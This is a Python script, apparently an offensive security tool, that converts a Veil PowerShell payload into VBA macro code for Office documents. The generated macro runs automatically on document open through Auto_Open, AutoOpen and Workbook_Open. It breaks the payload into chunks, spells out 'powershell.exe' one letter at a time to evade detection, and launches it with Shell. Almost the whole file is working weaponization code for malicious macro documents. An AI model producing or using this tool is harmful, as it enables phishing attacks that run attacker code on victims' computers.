#!/usr/bin/python

#####
# macro_safe.py
#####
#
# Takes Veil powershell batch file and outputs into a text document 
# macro safe text for straight copy/paste.
#

import os, sys
import re

def formStr(varstr, instr):
 holder = []
 str1 = ''
 str2 = ''
 str1 = varstr + ' = "' + instr[:54] + '"' 
 for i in xrange(54, len(instr), 48):
 	holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+48])
 	str2 = '"\r\n'.join(holder)
 
 str2 = str2 + "\""
 str1 = str1 + "\r\n"+str2
 return str1

if len(sys.argv) < 2:
 print "----------------------\n"
 print " Macro Safe\n"
 print "----------------------\n"
 print "\n"
 print "Takes Veil batch output and turns into macro safe text\n"
 print "\n"
 print "USAGE: " + sys.argv[0] + " <input batch> <output text>\n"
 print "\n"
else:

 fname = sys.argv[1]
 
 f = open(fname)
 lines = f.readlines()
 f.close()
 cut = []

 for line in lines:
 	if "@echo off" not in line:
 		first = line.split('else')
 		#split on else to truncate the back half
 
 		# split on \" 
 		cut = first[0].split('\\"', 4)
 
 		#get rid of everything before powershell
 		cut[0] = cut[0].split('%==x86')[1] 
 		cut[0] = cut[0][2:] 

 		#get rid of trailing parenthesis
 		cut[2] = cut[2].strip(" ")
 		cut[2] = cut[2][:-1]

 # for i in range(0,3):
 # print str(i) + " " +cut[i]
 
 top = "Sub Auto_Open()\r\n"
 top = top + "UpdateMacro\r\n"
 top = top + "End Sub\r\n"
 top = top + "\r\n"

 top = top + "Sub AutoOpen()\r\n"
 top = top + "UpdateMacro\r\n"
 top = top + "End Sub\r\n"
 top = top + "\r\n"

 top = top + "Sub Workbook_Open()\r\n"
 top = top + "UpdateMacro\r\n"
 top = top + "End Sub\r\n"
 top = top + "\r\n"

 top = top + "Sub UpdateMacro()\r\n"
 top = top + "Dim str As String\r\n"
 top = top + "Dim exec As String\r\n"
 top = top + "Dim sysroot\r\n"
 top = top + "Dim wshShell\r\n"
 
 #insert '\r\n' and 'str = str +' every 48 chars after the first 54.
 payL = formStr("str", str(cut[1]))
 
 #double up double quotes, add the rest of the exec string 
 idx = cut[0].index('"')
 cut[0] = cut[0][:idx] + '"' + cut[0][idx:]
 cut[0] = cut[0] + "\\\"\" \" & str & \" \\\"\" " + cut[2] +"\""

 #execStr = formStr("exec", str(cut[0]))
 execStr = "exec = \"%systemroot%\\Syswow64\\WindowsPowershell\\v1.0\\" +str(cut[0]) + "\""

 # write something to detrect syswow64 so it always runs a 32bit version

 psshell = str(cut[0]).replace('powershell.exe','')
 execStr = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n"
 execStr = execStr + "Set wshShell = CreateObject(\"WScript.Shell\")\n"
 execStr = execStr + "sysroot = wshShell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\")\n"
 execStr = execStr + "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n"
 execStr = execStr + "If objFSO.FolderExists(sysroot + \"\\Syswow64\\WindowsPowershell\\v1.0\\\") Then\n"
 execStr = execStr + "exec = sysroot + \"\Syswow64\\WindowsPow\"\n"
 execStr = execStr + "exec = exec + \"ershell\\v1.0\\\"\n" 
 execStr = execStr + "exec = exec + \"p\"\n"
 execStr = execStr + "exec = exec + \"o\"\n"
 execStr = execStr + "exec = exec + \"w\"\n"
 execStr = execStr + "exec = exec + \"e\"\n"
 execStr = execStr + "exec = exec + \"r\"\n"
 execStr = execStr + "exec = exec + \"s\"\n"
 execStr = execStr + "exec = exec + \"h\"\n"
 execStr = execStr + "exec = exec + \"e\"\n"
 execStr = execStr + "exec = exec + \"l\"\n"
 execStr = execStr + "exec = exec + \"l\"\n"
 execStr = execStr + "exec = exec + \".\"\n"
 execStr = execStr + "exec = exec + \"e\"\n"
 execStr = execStr + "exec = exec + \"x\"\n"
 execStr = execStr + "exec = exec + \"e" + psshell + "\"\n"
 execStr = execStr + "Else\n"
 execStr = execStr + "exec = \"p\"\n"
 execStr = execStr + "exec = exec + \"o\"\n"
 execStr = execStr + "exec = exec + \"w\"\n"
 execStr = execStr + "exec = exec + \"e\"\n"
 execStr = execStr + "exec = exec + \"r\"\n"
 execStr = execStr + "exec = exec + \"s\"\n"
 execStr = execStr + "exec = exec + \"h\"\n"
 execStr = execStr + "exec = exec + \"e\"\n"
 execStr = execStr + "exec = exec + \"l\"\n"
 execStr = execStr + "exec = exec + \"l\"\n"
 execStr = execStr + "exec = exec + \".\"\n"
 execStr = execStr + "exec = exec + \"e\"\n"
 execStr = execStr + "exec = exec + \"x\"\n"
 execStr = execStr + "exec = exec + \"e\"\n"
 execStr = execStr + "exec = \"" + psshell + "\"\n"
 execStr = execStr + "End If\n"

 shell = "Shell(exec)"
 bottom = "End Sub\r\n"
 
 final = ''
 final = top + "\r\n" + payL + "\r\n\r\n" + execStr + "\r\n\r\n" + shell + "\r\n\r\n" + bottom + "\r\n"

 print final

 try:
 	f = open(sys.argv[2],'w')
 	f.write(final) # python will convert \n to os.linesep
 	f.close()
 except:
 	print "Error writing file.\n Please check permissions and try again.\nExiting..."
 	sys.exit(1)
 
 print "File written to " + sys.argv[2] + " !"
